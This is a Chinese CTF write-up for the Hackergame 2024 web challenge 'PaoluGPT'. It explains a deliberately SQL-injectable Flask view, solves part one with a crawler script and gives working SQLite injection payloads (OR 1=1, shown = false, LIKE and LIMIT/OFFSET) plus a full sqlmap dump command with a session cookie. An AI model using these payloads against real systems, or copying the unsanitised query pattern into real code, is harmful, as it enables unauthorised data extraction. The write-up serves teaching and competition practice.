# PaoluGPT

题解作者：[taoky](https://github.com/taoky)

出题人、验题人、文案设计等：见 [Hackergame 2024 幕后工作人员](../../credits.pdf)。

## 题目描述

- 题目分类：web

- 题目分值：千里挑一（150）+ 窥视未知（200）

在大语言模型时代，几乎每个人都在和大语言模型聊天。小 Q 也想找一个方便使用的 GPT 服务，所以在熟人推荐下，他注册了某个 GPT 服务，并且付了几块钱。只是出乎小 Q 意料的是，他才用了几天，服务商就跑路了！跑路的同时，服务商还公开了一些用户的聊天记录。小 Q 看着这些聊天记录，突然发现里面好像有 flag……

**[题目附件下载](files/paolugpt.zip)**

**免责声明：本题数据来源自 [COIG-CQIA 数据集](https://modelscope.cn/datasets/m-a-p/COIG-CQIA/)。本题显示的所有该数据集中的数据均不代表 Hackergame 组委会的观点、意见与建议。**

提示：点击下面的「打开/下载题目」按钮会为你创建一个独立的题目环境，有效时间一小时。如果环境遇到问题，可以 [关闭环境](https://chal01-manager.hack-challenge.lug.ustc.edu.cn/docker-manager/stop?{token}) 后再试。

[打开/下载题目](https://chal01-manager.hack-challenge.lug.ustc.edu.cn/docker-manager/start?{token})

## 题解

本题的 idea 是 [@volltin](https://github.com/volltin/) 的。我做了实现。

本题是一道简单的 SQL 注入题，这一点从附件可以很明显发现：

```python
results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
```

附件中甚至提供了 DBMS 是 SQLite 的信息，省去了一些猜测的精力。

对于不会 SQL 注入的同学，第一小问也可以写爬虫解决。

### 爬虫

最简单的爬虫使用 Python + requests 库就可以解决。因为网页的结构很简单，甚至不需要~~漂亮汤~~ Beautiful Soup 来解析 HTML。

```python
import requests
import re
from urllib.parse import urljoin, urlparse

LINK = re.compile(r'<a href="(.+)">')


def get_all_links(session, url):
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"error on {url}: {e}")
        return []

    links = set()
    for i in LINK.findall(response.text):
        links.add(urljoin(url, i))

    return list(links)


def check_links_for_flag(session, links):
    for link in links:
        try:
            resp = session.get(link, timeout=10)
            resp.raise_for_status()
            if 'flag' in resp.text.lower():
                print(link)
        except requests.RequestException as e:
            print(f"error on {link}: {e}")


def main():
    url = "https://chal01-rw75jygx.hack-challenge.lug.ustc.edu.cn:8443/list"

    session = requests.Session()
    session.cookies.set('session', 'eyJ0b2tlbiI6IjU6TUVRQ0lGN1BSYlBlT2NqSFExRExuNFROVHdwcHp1OTBxU3JBRVJrOWIwdnNDM3B2QWlBU2dZRmpFaEVITjlsYmdvS01MVDZmZFp1RWVIZm1sSXkvK0l4T2Yvb2pYQT09In0.Zyc6qw.RnUrVg6o5TDBuWuENMBztxVcu7o')

    links = get_all_links(session, url)
    print(f"Get {len(links)} links...")

    check_links_for_flag(session, links)


if __name__ == "__main__":
    main()
```

需要注意的是，为了增加人肉处理的难度（鼓励自动化解决问题），我特地在 flag 前面加了很多很多换行，因此需要拖到最下面或者搜索才能看到 flag。

### SQL 注入

#### 手动挡

对于查询：

```SQL
select title, contents from messages where id = 'conversation_id'
```

很明显我们需要让 `conversation_id` 包含 `'` 来做注入，以及用注释 `--` 来扔掉末尾不想要的符号。一个经典验证的例子是，当 `conversation_id` 为 `' or 1=1 --` 时，查询语句就变成了：

```SQL
select title, contents from messages where id = '' or 1=1 --'
```

这个查询恒成立。但是网站代码只会选择第一个显示：

```python
# database.py
def execute_query(s: str, fetch_all: bool = False):
    conn = sqlite3.connect("file:/tmp/data.db?mode=ro", uri=True)
    cur = conn.cursor()
    res = cur.execute(s)
    if fetch_all:
        return res.fetchall()
    else:
        return res.fetchone()

# main.py, view()
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

如果看了 `list()` 函数，会发现有个 `shown` 条件，因此构造成如下面的查询：

```SQL
select title, contents from messages where id = '' or shown = false --'
```

就能拿到第二个 flag 了（因为 `shown = false` 的只有一条）。

要通过这种方式拿到第一个 flag 也是可以的，只是会更复杂一些。考虑数据库的 `LIKE` 语法：

```SQL
select something from sometable where contents like '%flag%'
```

就可以把所有 `contents` 里面有 `flag` 字符串的行挑出来，因此第一个 flag 可以：

```SQL
select title, contents from messages where id = '' or shown = true and contents like '%flag%' --'
```

这样就得到了第一个 flag。除此之外，另一个方法是使用数据库的 `LIMIT` 和 `OFFSET` 语法：

```SQL
select title, contents from messages where id = '' or 1=1 limit 1 offset 123 --'
```

`limit 1` 表示限制输出 1 行，`offset 123` 表示跳过 123 行（即选择第 124 行）。然后和爬虫类似写个脚本即可。做一千次请求也能获取所有的 flag。

#### 自动挡

为什么不试试 [sqlmap](https://sqlmap.org) 呢？注意题目需要 session，因此调用 sqlmap 的时候必须附带这一信息：

```sh
sqlmap -a --cookie=session=eyJ0b2tlbiI6IjU6TUVRQ0lGN1BSYlBlT2NqSFExRExuNFROVHdwcHp1OTBxU3JBRVJrOWIwdnNDM3B2QWlBU2dZRmpFaEVITjlsYmdvS01MVDZmZFp1RWVIZm1sSXkvK0l4T2Yvb2pYQT09In0.Zyc6qw.RnUrVg6o5TDBuWuENMBztxVcu7o -u 'https://chal01-rw75jygx.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=f924cc11-2d09-43a0-bfd8-b2bd1faf9e4c'
```

接下来一路按回车就行。需要注意的是直接对着 `sqlmap` 的 stdout grep 可能是找不到 flag 的，因为：

```console
[WARNING] console output will be trimmed to last 256 rows due to large table size
```

注意到最后：

```console
[17:36:42] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/username/.local/share/sqlmap/output/chal01-rw75jygx.hack-challenge.lug.ustc.edu.cn/dump/SQLite_masterdb/messages.csv'
```

所以去拿 flag 吧。不过如果希望更加熟悉 SQL 注入的话，看看 sqlmap 发了啥可能会有所帮助。这可以通过添加 `-vvv` 参数来实现。

## 附注

PaoluGPT 的代码有个小问题：如果 `conversation_id` 不存在，会返回 500 错误。但是不会影响求解题目。
